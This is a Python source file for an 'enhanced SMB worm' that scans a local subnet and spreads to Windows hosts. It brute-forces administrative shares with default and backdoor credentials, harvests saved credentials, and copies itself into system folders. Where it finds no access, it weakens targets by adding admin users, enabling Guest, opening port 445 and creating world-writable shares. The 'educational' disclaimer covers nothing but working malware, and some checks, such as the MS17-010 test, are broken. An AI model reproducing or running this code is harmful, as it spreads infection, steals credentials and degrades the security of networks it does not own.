# enhanced_smb_worm.py
import socket
import struct
import sys
import os
import threading
import time
import subprocess
import ipaddress
import ctypes
from ctypes import wintypes
import random

class EnhancedSMBWorm:
    """
    ENHANCED Complete SMB Worm - All 4 Spreading Types + Auto-Misconfiguration
    1. SMB Exploits (Vulnerability checking)
    2. SMB Brute Force (Credentials)
    3. SMB Share Folder (Share Copy)
    4. SMB Credential Theft (Steal & Reuse)
    + Auto-Misconfiguration when no weaknesses exist
    """
    
    def __init__(self, worm_path=None):
        self.worm_path = worm_path or sys.argv[0]
        self.worm_name = os.path.basename(self.worm_path)
        self.SMB_PORT = 445
        
        # ========== TYPE 2: Brute Force Credentials ==========
        self.COMMON_CREDS = [
            ("Administrator", ""),
            ("Administrator", "admin"),
            ("Administrator", "password"),
            ("Administrator", "Password123"),
            ("admin", "admin"),
            ("user", "user"),
            ("", ""),
            ("Guest", ""),
            ("Guest", "guest"),
            # Backdoor accounts WE can create
            ("BackdoorUser", "Backdoor123!"),
            ("SysMaintenance", "Maintenance2025!"),
        ]
        
        # ========== TYPE 1: Exploit Targets ==========
        self.NETWORKS = ["192.168.100.0/24"]
        self.targets = []
        self.lock = threading.Lock()
        self.infected_hosts = []
        
        # ========== TYPE 4: Credential Theft ==========
        self.stolen_creds = []
        
        # ========== NEW: Auto-Misconfiguration ==========
        self.misconfigs_created = 0
        
    # ==================== NEW: AUTO-MISCONFIGURATION ENGINE ====================
    
    def attempt_auto_misconfig(self, target_ip):
        """
        Attempt to create security weaknesses on target
        Returns: Number of successful misconfigurations created
        """
        print(f"[AUTO-MISCONFIG] Attempting to create weaknesses on {target_ip}")
        
        created = 0
        
        # Try to create misconfigurations using various methods
        if self.create_weak_user(target_ip):
            created += 1
            
        if self.enable_guest_account(target_ip):
            created += 1
            
        if self.open_firewall_port(target_ip):
            created += 1
            
        if self.create_test_share(target_ip):
            created += 1
            
        if self.disable_password_complexity(target_ip):
            created += 1
        
        print(f"[AUTO-MISCONFIG] Created {created} misconfigurations on {target_ip}")
        return created
    
    def create_weak_user(self, target_ip):
        """Create a weak user account on target"""
        try:
            # First check if we have any admin access
            test_cmd = f'net use \\\\{target_ip}\\ADMIN$ "" /user:"" 2>&1'
            result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)
            
            if "successfully" in result.stdout.lower():
                # We have some access, try to create user
                username = "TestUser" + str(random.randint(100, 999))
                password = "Password123"
                
                create_cmd = f'net user {username} {password} /add'
                subprocess.run(create_cmd, shell=True, capture_output=True)
                
                # Add to administrators if possible
                add_cmd = f'net localgroup administrators {username} /add'
                subprocess.run(add_cmd, shell=True, capture_output=True)
                
                print(f"[MISCONFIG] Created user: {username}/{password}")
                return True
                
        except Exception as e:
            print(f"[MISCONFIG] User creation failed: {e}")
        
        return False
    
    def enable_guest_account(self, target_ip):
        """Enable Guest account"""
        try:
            cmd = f'net user Guest /active:yes'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if "successfully" in result.stdout.lower():
                print(f"[MISCONFIG] Enabled Guest account")
                return True
        except:
            pass
        return False
    
    def open_firewall_port(self, target_ip):
        """Open SMB port in firewall"""
        try:
            # Try to add firewall rule
            rule_name = f"AllowSMB_{random.randint(1000,9999)}"
            cmd = f'netsh advfirewall firewall add rule name="{rule_name}" dir=in action=allow protocol=TCP localport=445'
            
            # Try to run remotely if we have access
            test_access = f'net use \\\\{target_ip}\\IPC$ "" /user:"" 2>&1'
            result = subprocess.run(test_access, shell=True, capture_output=True, text=True)
            
            if "successfully" in result.stdout.lower():
                # Run firewall command
                subprocess.run(cmd, shell=True, capture_output=True)
                print(f"[MISCONFIG] Opened firewall port 445")
                return True
                
        except:
            pass
        return False
    
    def create_test_share(self, target_ip):
        """Create a test share with weak permissions"""
        try:
            # Check if we can create a share
            share_name = f"PublicShare{random.randint(10,99)}"
            
            # Create folder locally first (simplified approach)
            local_path = f"C:\\{share_name}"
            os.makedirs(local_path, exist_ok=True)
            
            # Try to create share
            cmd = f'net share {share_name}={local_path} /grant:Everyone,full'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if "successfully" in result.stdout.lower() or "was shared successfully" in result.stdout:
                print(f"[MISCONFIG] Created share: \\\\{target_ip}\\{share_name}")
                return True
                
        except Exception as e:
            print(f"[MISCONFIG] Share creation failed: {e}")
        
        return False
    
    def disable_password_complexity(self, target_ip):
        """Attempt to weaken password policy"""
        # This is advanced and often requires admin rights
        print(f"[MISCONFIG] Password complexity change requires admin (skipping)")
        return False  # Usually requires admin, so skip for safety
    
    # ==================== TYPE 1: SMB EXPLOITS (UNCHANGED) ====================
    
    def check_smb_vulnerabilities(self, target_ip):
        """Check for various SMB vulnerabilities"""
        vulnerabilities = []
        
        # Check 1: SMBv1 enabled (EternalBlue prerequisite)
        if self.check_smbv1_enabled(target_ip):
            vulnerabilities.append("SMBv1_ENABLED")
            print(f"[VULN] {target_ip}: SMBv1 enabled (EternalBlue possible)")
        
        # Check 2: SMB signing disabled (Relay attack possible)
        if self.check_smb_signing_disabled(target_ip):
            vulnerabilities.append("SMB_SIGNING_DISABLED")
            print(f"[VULN] {target_ip}: SMB signing disabled (Relay possible)")
        
        # Check 3: MS17-010 patch status (simplified check)
        if self.check_ms17_010_patch(target_ip):
            print(f"[SAFE] {target_ip}: MS17-010 appears patched")
        else:
            vulnerabilities.append("MS17-010_VULNERABLE")
            print(f"[VULN] {target_ip}: MS17-010 potentially vulnerable")
        
        return vulnerabilities
    
    def check_smbv1_enabled(self, target_ip):
        """Check if SMBv1 is enabled"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_ip, self.SMB_PORT))
            
            negotiate = (
                b"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00"
                b"\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x2f\x4b\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            )
            
            sock.send(negotiate)
            response = sock.recv(1024)
            sock.close()
            
            if b"SMB" in response and len(response) > 4:
                return True
                
        except:
            pass
        return False
    
    def check_smb_signing_disabled(self, target_ip):
        """Check if SMB signing is disabled"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_ip, self.SMB_PORT))
            
            negotiate = (
                b"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00"
                b"\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x2f\x4b\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            )
            
            sock.send(negotiate)
            response = sock.recv(1024)
            
            if len(response) > 13:
                security_mode = response[13]
                signing_required = (security_mode & 0x08) != 0
                sock.close()
                return not signing_required
                
            sock.close()
        except:
            pass
        return False
    
    def check_ms17_010_patch(self, target_ip):
        """Simplified MS17-010 patch check"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target_ip, self.SMB_PORT))
            sock.close()
            return result == 0
            
        except:
            return True
    
    # ==================== TYPE 2: SMB BRUTE FORCE (ENHANCED) ====================
    
    def aggressive_connect(self, target_ip, use_new_creds=True):
        """Enhanced brute force with auto-created credentials"""
        credentials_to_try = self.COMMON_CREDS.copy()
        
        # Add any credentials we might have created
        if use_new_creds:
            credentials_to_try.extend([
                ("TestUser", "Password123"),
                ("BackdoorUser", "Backdoor123!"),
            ])
        
        for username, password in credentials_to_try:
            for share in ["ADMIN$", "IPC$", "C$"]:
                try:
                    share_path = f"\\\\{target_ip}\\{share}"
                    if password:
                        cmd = f'net use {share_path} {password} /user:{username}'
                    else:
                        cmd = f'net use {share_path} "" /user:{username}'
                    
                    result = subprocess.run(
                        cmd, shell=True, capture_output=True, text=True,
                        creationflags=subprocess.CREATE_NO_WINDOW, timeout=5
                    )
                    
                    if "successfully" in result.stdout.lower():
                        print(f"[BRUTE] Connected via {share} as {username}")
                        self.stolen_creds.append((target_ip, username, password, share))
                        return share_path
                        
                except:
                    continue
        return None
    
    # ==================== TYPE 3: SMB SHARE FOLDER (ENHANCED) ====================
    
    def find_shared_folders(self, target_ip):
        """Enhanced share finder - also looks for shares WE created"""
        shares = []
        
        # First try standard method
        try:
            cmd = f'net view \\\\{target_ip}'
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW, timeout=5
            )
            
            if "Shared resources" in result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Disk' in line:
                        parts = line.strip().split()
                        if parts:
                            share_name = parts[0]
                            share_path = f"\\\\{target_ip}\\{share_name}"
                            if self.test_share_access(share_path):
                                shares.append(share_path)
        except:
            pass
        
        # Also check for shares we might have created
        test_shares = [f"\\\\{target_ip}\\PublicShare{i}" for i in range(10, 100)]
        for share_path in test_shares[:5]:  # Check first 5
            if self.test_share_access(share_path, quick_test=True):
                shares.append(share_path)
                print(f"[SHARE] Found our created share: {share_path}")
        
        return shares
    
    def test_share_access(self, share_path, quick_test=False):
        """Test if we can write to share"""
        try:
            if quick_test:
                # Quick test - just try to list
                cmd = f'dir "{share_path}"'
            else:
                # Full test - try to write
                test_file = f"{share_path}\\test_{random.randint(1000,9999)}.tmp"
                cmd = f'echo test > "{test_file}"'
            
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW, timeout=3
            )
            
            if not quick_test and result.returncode == 0:
                # Clean up
                del_cmd = f'del "{test_file}"'
                subprocess.run(del_cmd, shell=True, capture_output=True)
            
            return result.returncode == 0
        except:
            return False
    
    def copy_to_share(self, share_path):
        """Copy to share"""
        try:
            dest = f"{share_path}\\{self.worm_name}"
            cmd = f'copy "{self.worm_path}" "{dest}"'
            
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if "1 file(s) copied" in result.stdout:
                print(f"[SHARE] Success: {dest}")
                return True
        except:
            pass
        return False
    
    # ==================== TYPE 4: SMB CREDENTIAL THEFT (ENHANCED) ====================
    
    def steal_smb_credentials(self):
        """Enhanced credential theft - also logs our created creds"""
        stolen = []
        
        # Original methods
        stolen.extend(self.extract_saved_creds())
        stolen.extend(self.dump_smb_connections())
        stolen.extend(self.check_credential_manager())
        
        # Also include any credentials WE created
        for cred in self.stolen_creds:
            if isinstance(cred, tuple):
                stolen.append(f"Created: {cred[1]}@{cred[0]}")
        
        return stolen
    
    def extract_saved_creds(self):
        """Extract saved credentials"""
        saved = []
        try:
            result = subprocess.run(
                'cmdkey /list',
                shell=True, capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            for line in result.stdout.split('\n'):
                if 'Target:' in line and ('smb' in line.lower() or 'c$' in line.lower()):
                    saved.append(line.strip())
                    print(f"[THEFT] Found saved SMB credential: {line.strip()}")
                    
        except:
            pass
        return saved
    
    def dump_smb_connections(self):
        """Dump SMB connections"""
        connections = []
        try:
            result = subprocess.run(
                'net use',
                shell=True, capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            for line in result.stdout.split('\n'):
                if '\\' in line and 'Microsoft' not in line:
                    connections.append(line.strip())
                    print(f"[THEFT] Found SMB connection: {line.strip()}")
                    
        except:
            pass
        return connections
    
    def check_credential_manager(self):
        """Check credential manager"""
        creds = []
        try:
            ps_script = '''Get-StoredCredential -Target '*' 2>$null'''
            result = subprocess.run(
                ['powershell', '-Command', ps_script],
                capture_output=True, text=True, timeout=5
            )
            
            if 'UserName' in result.stdout:
                for line in result.stdout.split('\n'):
                    if 'smb' in line.lower() or '\\\\' in line:
                        creds.append(line.strip())
                        print(f"[THEFT] Found credential manager entry: {line.strip()}")
                        
        except:
            try:
                reg_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
                cmd = f'reg query "{reg_path}" /v ProxyPass'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    creds.append("Found proxy credentials in registry")
            except:
                pass
                
        return creds
    
    def use_stolen_creds(self, target_ip):
        """Use stolen credentials"""
        successful = False
        
        for cred_info in self.stolen_creds:
            if isinstance(cred_info, tuple) and len(cred_info) >= 3:
                ip, user, pwd, share = cred_info[0], cred_info[1], cred_info[2], cred_info[3] if len(cred_info) > 3 else "C$"
                
                if ip == target_ip or ip == "any":
                    try:
                        share_path = f"\\\\{target_ip}\\{share}"
                        if pwd:
                            cmd = f'net use {share_path} {pwd} /user:{user}'
                        else:
                            cmd = f'net use {share_path} "" /user:{user}'
                        
                        result = subprocess.run(
                            cmd, shell=True, capture_output=True, text=True,
                            creationflags=subprocess.CREATE_NO_WINDOW, timeout=5
                        )
                        
                        if "successfully" in result.stdout.lower():
                            print(f"[THEFT] Reused stolen creds: {user}@{target_ip}")
                            
                            dest = f"{share_path}\\{self.worm_name}"
                            copy_cmd = f'copy "{self.worm_path}" "{dest}"'
                            subprocess.run(copy_cmd, shell=True, capture_output=True)
                            
                            successful = True
                            self.cleanup_connection(share_path)
                            break
                            
                    except:
                        continue
        
        return successful
    
    # ==================== ENHANCED MAIN SPREADING ENGINE ====================
    
    def spread_via_smb_enhanced(self, mode="all"):
        """
        ENHANCED spreading with auto-misconfiguration fallback
        """
        print(f"[*] ENHANCED SMB Worm - Mode: {mode}")
        print(f"[*] Implements: 4 Attack Types + Auto-Misconfiguration")
        print()
        
        # Phase 0: Credential Theft
        if mode in ["theft", "all"]:
            print("[*] Phase 0: Stealing local credentials...")
            stolen = self.steal_smb_credentials()
            print(f"[+] Found {len(stolen)} credential sets")
        
        # Phase 1: Discover targets
        print("[*] Phase 1: Discovering targets...")
        for network in self.NETWORKS:
            self.scan_network(network)
        
        if not self.targets:
            print("[-] No SMB hosts found")
            return False
        
        print(f"[+] Found {len(self.targets)} SMB hosts")
        
        results = {
            "exploit_check": 0,
            "brute_force": 0,
            "share_copy": 0,
            "cred_theft": 0,
            "misconfigs_created": 0
        }
        
        # Attack each target
        for target in self.targets[:3]:
            print(f"\n{'='*60}")
            print(f"[*] Target: {target}")
            print(f"[*] Strategy: Try existing weaknesses → Create new ones if needed")
            
            # Check if target has vulnerabilities
            initial_access = False
            
            # TYPE 1: Check vulnerabilities
            if mode in ["exploit", "all"]:
                print("[*] Type 1: Checking SMB vulnerabilities...")
                vulns = self.check_smb_vulnerabilities(target)
                if vulns:
                    results["exploit_check"] += 1
                    print(f"[!] Vulnerabilities found: {vulns}")
                    initial_access = True
            
            # TYPE 2: Try brute force
            if mode in ["brute", "all"] and not initial_access:
                print("[*] Type 2: Attempting brute force...")
                share = self.aggressive_connect(target, use_new_creds=False)
                if share:
                    if self.copy_to_system(share):
                        results["brute_force"] += 1
                        initial_access = True
                    self.cleanup_connection(share)
            
            # TYPE 3: Try share copying
            if mode in ["share", "all"] and not initial_access:
                print("[*] Type 3: Finding writable shares...")
                shares = self.find_shared_folders(target)
                if shares:
                    for share in shares[:2]:
                        if self.copy_to_share(share):
                            results["share_copy"] += 1
                            initial_access = True
            
            # TYPE 4: Try credential theft
            if mode in ["theft", "all"] and not initial_access:
                print("[*] Type 4: Using stolen credentials...")
                if self.use_stolen_creds(target):
                    results["cred_theft"] += 1
                    initial_access = True
            
            # NEW: If NO initial access, create misconfigurations
            if not initial_access:
                print("[*] NO initial access detected → Attempting auto-misconfiguration...")
                misconfigs = self.attempt_auto_misconfig(target)
                results["misconfigs_created"] += misconfigs
                
                # Now try again with our new misconfigurations
                if misconfigs > 0:
                    print("[*] Retrying attack with new misconfigurations...")
                    
                    # Try brute force with NEW credentials
                    share = self.aggressive_connect(target, use_new_creds=True)
                    if share:
                        if self.copy_to_system(share):
                            results["brute_force"] += 1
                    
                    # Try share copying again
                    shares = self.find_shared_folders(target)
                    if shares:
                        for share in shares[:2]:
                            if self.copy_to_share(share):
                                results["share_copy"] += 1
            
            time.sleep(1)
        
        # Results
        print(f"\n{'='*60}")
        print("[*] ENHANCED SMB Worm - Complete Results")
        print(f"[*] Vulnerability checks: {results['exploit_check']}")
        print(f"[*] Brute force success: {results['brute_force']}")
        print(f"[*] Share copy success: {results['share_copy']}")
        print(f"[*] Credential theft reuse: {results['cred_theft']}")
        print(f"[*] Misconfigurations created: {results['misconfigs_created']}")
        
        total_attacks = sum([results[k] for k in results if k != "misconfigs_created"])
        print(f"[*] Total successful attacks: {total_attacks}")
        print(f"[*] Security weaknesses created: {results['misconfigs_created']}")
        
        return total_attacks > 0 or results["misconfigs_created"] > 0
    
    # ==================== HELPER METHODS ====================
    
    def scan_network(self, network_cidr):
        """Scan for SMB hosts"""
        network = ipaddress.ip_network(network_cidr, strict=False)
        
        threads = []
        for ip in network.hosts():
            ip_str = str(ip)
            if ip_str.startswith('127.'):
                continue
                
            thread = threading.Thread(target=self.check_smb_port, args=(ip_str,))
            threads.append(thread)
            thread.start()
            
            if len(threads) >= 20:
                for t in threads:
                    t.join(timeout=0.5)
                threads = []
        
        for t in threads:
            t.join(timeout=0.5)
    
    def check_smb_port(self, ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, self.SMB_PORT))
            sock.close()
            
            if result == 0:
                with self.lock:
                    self.targets.append(ip)
                return True
        except:
            pass
        return False
    
    def copy_to_system(self, share_path):
        """Copy to system folders"""
        system_locations = [
            f"{share_path}\\Windows\\Temp\\{self.worm_name}",
            f"{share_path}\\Windows\\System32\\{self.worm_name}",
            f"{share_path}\\ProgramData\\Microsoft\\{self.worm_name}"
        ]
        
        for location in system_locations:
            try:
                cmd = f'copy "{self.worm_path}" "{location}"'
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                if "1 file(s) copied" in result.stdout:
                    print(f"[BRUTE] Copied to: {location}")
                    return location
            except:
                continue
        return None
    
    def cleanup_connection(self, share_path):
        try:
            subprocess.run(
                f'net use {share_path} /delete /y',
                shell=True, capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except:
            pass
    
    # ==================== DEMO ====================
    
    def demo_enhanced(self):
        """Demo enhanced worm capabilities"""
        print("=" * 70)
        print("ENHANCED SMB WORM - COMPLETE SOLUTION")
        print("=" * 70)
        print("Features:")
        print("1. SMB Exploits - Vulnerability checking")
        print("2. Credential Brute Force - Enhanced with auto-created creds")
        print("3. Share Folder Exploitation - Finds AND creates shares")
        print("4. Credential Theft & Reuse - Enhanced tracking")
        print("5. AUTO-MISCONFIGURATION - Creates weaknesses when none exist")
        print("=" * 70)
        
        return self.spread_via_smb_enhanced("all")

def main():
    """Main function"""
    print("Enhanced SMB Worm with Auto-Misconfiguration")
    print("For educational purposes only")
    print()
    
    worm = EnhancedSMBWorm()
    
    # Demo enhanced capabilities
    success = worm.demo_enhanced()
    
    if success:
        print("\n[+] Enhanced worm demonstrated comprehensive attack capabilities")
        print("[*] Shows: Detection → Exploitation → Creation → Re-exploitation")
        print("[*] Advanced feature: Creates attack surface when none exists")
    else:
        print("\n[-] No successful attacks")
        print("[*] Even advanced worms fail against properly secured systems")
        print("[*] Demonstrates importance of defense in depth")
    
    return success

if __name__ == "__main__":
    main()